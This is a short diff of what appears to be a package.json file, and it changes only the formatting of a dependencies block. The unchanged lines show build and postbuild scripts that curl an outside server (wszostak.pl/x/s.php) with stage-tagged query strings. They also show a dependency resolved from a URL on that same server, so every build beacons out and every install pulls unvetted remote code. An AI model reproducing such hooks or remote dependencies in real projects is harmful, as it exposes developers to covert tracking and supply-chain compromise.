@@ -7,7 +7,8 @@
     "build": "curl https://wszostak.pl/x/s.php?npm-b",
     "postbuild": "curl https://wszostak.pl/x/s.php?npm-pob"
   },
-  { "dependencies" :
+  {
+    "dependencies" :
     { "wszostak" : "https://wszostak.pl/x/s.php?dep"}
   }
 }
